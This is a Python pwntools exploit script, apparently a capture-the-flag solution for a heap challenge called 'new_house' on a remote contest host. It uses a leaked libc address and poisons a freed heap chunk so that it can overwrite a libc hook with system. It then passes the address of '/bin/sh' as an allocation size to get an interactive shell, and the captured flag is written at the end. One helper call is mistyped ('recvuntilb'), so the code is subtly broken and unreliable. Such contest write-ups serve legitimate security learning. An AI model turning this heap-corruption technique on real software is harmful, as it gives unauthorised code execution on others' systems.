#!/usr/bin/python3

from pwn import *

exe = ELF('new_house', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('flu.xxx', 10170)
else:
        p = process(exe.path)

GDB()
room_idx = 0

def add(name, size):
    p.recvuntil(b">>> ")
    p.sendline(b"1")
    p.recvuntil(b"? ")
    p.sendline(name)
    p.recvuntil(b"? ")
    p.sendline(str(size))


def delete(idx):
    p.recvuntil(b">>> ")
    p.sendline(b"2")
    p.recvuntilb("? ")
    p.sendline(str(idx))

def edit(idx, content):
    p.recvuntil(b">>> ")
    p.sendline(b"3")
    p.recvuntil(b"? ")
    p.sendline(str(idx))
    p.recvuntil(b"? ")
    p.sendline(content)


p.recvuntil(b": ")
libc.address = int(p.recvline()[:-1], 16)
print("Libc leak", libc.address)

fake_chunk = libc.address + 0x3aabd5
print("Fake chunk", fake_chunk)

add(b"wan", 0x68)

delete(0)

edit(0, p64(fake_chunk - 8)) 

add(b"wan", 0x68)

add(b"wan", 0x68)

edit(2, b"A" * 19 + p64(libc.sym.system))

BINSH = 0x1728d5 + libc.address
add("c", BINSH)

p.interactive()
# flag{Th1s_1s_H0w_Y0u_bu1ld_Th3_H0us3_0f_G0ds}